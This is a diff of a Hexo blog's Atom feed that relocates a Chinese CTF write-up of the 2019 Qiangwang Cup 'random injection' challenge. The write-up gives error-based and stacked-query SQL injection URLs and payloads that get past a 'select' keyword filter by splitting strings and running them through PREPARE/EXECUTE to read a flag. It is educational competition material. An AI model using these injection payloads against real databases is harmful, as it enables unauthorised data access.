@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://c1aysec.github.io/"/>
-  <updated>2019-05-27T16:15:25.099Z</updated>
+  <updated>2019-11-06T17:11:00.406Z</updated>
   <id>https://c1aysec.github.io/</id>
   
   <author>
@@ -15,31 +15,6 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
-  
-  <entry>
-    <title>2019强网杯-过滤select的注入</title>
-    <link href="https://c1aysec.github.io/2019/11/06/2019%E5%BC%BA%E7%BD%91%E6%9D%AF-%E8%BF%87%E6%BB%A4select%E7%9A%84%E6%B3%A8%E5%85%A5/"/>
-    <id>https://c1aysec.github.io/2019/11/06/2019强网杯-过滤select的注入/</id>
-    <published>2019-11-06T15:33:05.997Z</published>
-    <updated>2019-05-27T16:15:25.099Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="2019强网杯-过滤select的注入"><a href="#2019强网杯-过滤select的注入" class="headerlink" title="2019强网杯-过滤select的注入"></a>2019强网杯-过滤select的注入</h1><h3 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h3><p><strong>这道题的题目就是随便注，说是取自某次真实渗透环境，确定了这道题是考察注入，经测试发现为单引号包裹的字符型注入，但是存在存在过滤，过滤的sql关键字如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>, $inject);</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20190528/mY2fTXh6Wy5t.png" alt="mark"><br><strong>这里过滤了select关键字，/i表示对大小写进行检查，所以大小写绕过无效，所以这里需要想别的办法，首先通过报错注入可以获取数据库的相关信息</strong></p><p><strong>通过报错注入获取当前数据库类型与版本：</strong></p><pre><code>http://117.78.39.172:32689/?inject=-1%27%20and%20extractvalue(1,concat(1,version()))--+</code></pre><p><img src="http://pic.c1imber.top/blog/20190528/oF419eR52pVL.png" alt="mark"><br><strong>.27-MariaDB-0ubuntu0.16.04.1</strong></p><p><strong>获取当前数据库名：</strong><br><img src="http://pic.c1imber.top/blog/20190528/NtJ9xJxCGk4O.png" alt="mark"><br><strong>supersqli</strong></p><p><strong>这里因为严格过滤了select关键字，导致不能继续注入，但是之后发现可以执行多语句，通过堆叠查询成功获取当前数据库（supersqli）下的表名</strong></p><pre><code>http://117.78.39.172:32689/?inject=-1%27;use%20supersqli;show%20tables;--+</code></pre><p><img src="http://pic.c1imber.top/blog/20190528/0isGzvkxIDkd.png" alt="mark"><br><strong>于是有了一个清晰的思路，可以通过执行多语句，将要执行的sql语句进行拼接，这样就可以将过滤的 sql关键字拆分绕过检测，通过动态执行sql语句发现1919810931114514表当中存在flag字段，payload如下</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">';<span class="keyword">use</span> information_schema;<span class="keyword">set</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="string">'s'</span>,<span class="string">'elect column_name from columns wher'</span>,<span class="string">'e table_name="1919810931114514"'</span>);<span class="keyword">PREPARE</span> stmt1 <span class="keyword">FROM</span> @<span class="keyword">sql</span>;<span class="keyword">EXECUTE</span> stmt1;<span class="comment">--+</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20190528/LPeDMW7UJFWE.png" alt="mark"><br><strong>之后就可以获取flag列的内容了</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">';<span class="keyword">use</span> supersqli;<span class="keyword">set</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="string">'s'</span>,<span class="string">'elect `flag` from `1919810931114514`'</span>);<span class="keyword">PREPARE</span> stmt1 <span class="keyword">FROM</span> @<span class="keyword">sql</span>;<span class="keyword">EXECUTE</span> stmt1;<span class="comment">--+</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20190528/hn2CDwKtqwoR.png" alt="mark"></p><p><strong>（需要注意的一点是这一点使用了strstr对set和prepare关键字进行了检查，但是strstr检查不对大小写进行检查，所以这里可以通过大小写绕过，set和prepare关键字只要有一个是大写就可以绕过）</strong><br><img src="http://pic.c1imber.top/blog/20190528/hXVAJ6ouP22Q.png" alt="mark"></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h1 id=&quot;2019强网杯-过滤select的注入&quot;&gt;&lt;a href=&quot;#2019强网杯-过滤select的注入&quot; class=&quot;headerlink&quot; title=&quot;2019强网杯-过滤select的注入&quot;&gt;&lt;/a&gt;2019强网杯-过滤select的注入&lt;/h1&gt;&lt;h3 i
-      
-    
-    </summary>
-    
-      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
-    
-    
-      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
-    
-  </entry>
   
   <entry>
     <title>ctf记录-记一次有趣的注入</title>
@@ -80,6 +55,31 @@
       
       
         &lt;h1 id=&quot;2019极客巅峰ctf记录&quot;&gt;&lt;a href=&quot;#2019极客巅峰ctf记录&quot; class=&quot;headerlink&quot; title=&quot;2019极客巅峰ctf记录&quot;&gt;&lt;/a&gt;2019极客巅峰ctf记录&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;周六抽时间做了2019极客巅峰的ct
+      
+    
+    </summary>
+    
+      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
+    
+    
+      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>2019强网杯-过滤select的注入</title>
+    <link href="https://c1aysec.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AF-%E8%BF%87%E6%BB%A4select%E7%9A%84%E6%B3%A8%E5%85%A5/"/>
+    <id>https://c1aysec.github.io/2019/05/28/2019强网杯-过滤select的注入/</id>
+    <published>2019-05-27T16:15:00.000Z</published>
+    <updated>2019-11-06T17:21:20.991Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="2019强网杯-过滤select的注入"><a href="#2019强网杯-过滤select的注入" class="headerlink" title="2019强网杯-过滤select的注入"></a>2019强网杯-过滤select的注入</h1><h3 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h3><p><strong>这道题的题目就是随便注，说是取自某次真实渗透环境，确定了这道题是考察注入，经测试发现为单引号包裹的字符型注入，但是存在存在过滤，过滤的sql关键字如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>, $inject);</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20190528/mY2fTXh6Wy5t.png" alt="mark"><br><strong>这里过滤了select关键字，/i表示对大小写进行检查，所以大小写绕过无效，所以这里需要想别的办法，首先通过报错注入可以获取数据库的相关信息</strong></p><p><strong>通过报错注入获取当前数据库类型与版本：</strong></p><pre><code>http://117.78.39.172:32689/?inject=-1%27%20and%20extractvalue(1,concat(1,version()))--+</code></pre><p><img src="http://pic.c1imber.top/blog/20190528/oF419eR52pVL.png" alt="mark"><br><strong>.27-MariaDB-0ubuntu0.16.04.1</strong></p><p><strong>获取当前数据库名：</strong><br><img src="http://pic.c1imber.top/blog/20190528/NtJ9xJxCGk4O.png" alt="mark"><br><strong>supersqli</strong></p><p><strong>这里因为严格过滤了select关键字，导致不能继续注入，但是之后发现可以执行多语句，通过堆叠查询成功获取当前数据库（supersqli）下的表名</strong></p><pre><code>http://117.78.39.172:32689/?inject=-1%27;use%20supersqli;show%20tables;--+</code></pre><p><img src="http://pic.c1imber.top/blog/20190528/0isGzvkxIDkd.png" alt="mark"><br><strong>于是有了一个清晰的思路，可以通过执行多语句，将要执行的sql语句进行拼接，这样就可以将过滤的 sql关键字拆分绕过检测，通过动态执行sql语句发现1919810931114514表当中存在flag字段，payload如下</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">';<span class="keyword">use</span> information_schema;<span class="keyword">set</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="string">'s'</span>,<span class="string">'elect column_name from columns wher'</span>,<span class="string">'e table_name="1919810931114514"'</span>);<span class="keyword">PREPARE</span> stmt1 <span class="keyword">FROM</span> @<span class="keyword">sql</span>;<span class="keyword">EXECUTE</span> stmt1;<span class="comment">--+</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20190528/LPeDMW7UJFWE.png" alt="mark"><br><strong>之后就可以获取flag列的内容了</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">';<span class="keyword">use</span> supersqli;<span class="keyword">set</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="string">'s'</span>,<span class="string">'elect `flag` from `1919810931114514`'</span>);<span class="keyword">PREPARE</span> stmt1 <span class="keyword">FROM</span> @<span class="keyword">sql</span>;<span class="keyword">EXECUTE</span> stmt1;<span class="comment">--+</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20190528/hn2CDwKtqwoR.png" alt="mark"></p><p><strong>（需要注意的一点是这一点使用了strstr对set和prepare关键字进行了检查，但是strstr检查不对大小写进行检查，所以这里可以通过大小写绕过，set和prepare关键字只要有一个是大写就可以绕过）</strong><br><img src="http://pic.c1imber.top/blog/20190528/hXVAJ6ouP22Q.png" alt="mark"></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;2019强网杯-过滤select的注入&quot;&gt;&lt;a href=&quot;#2019强网杯-过滤select的注入&quot; class=&quot;headerlink&quot; title=&quot;2019强网杯-过滤select的注入&quot;&gt;&lt;/a&gt;2019强网杯-过滤select的注入&lt;/h1&gt;&lt;h3 i
       
     
     </summary>
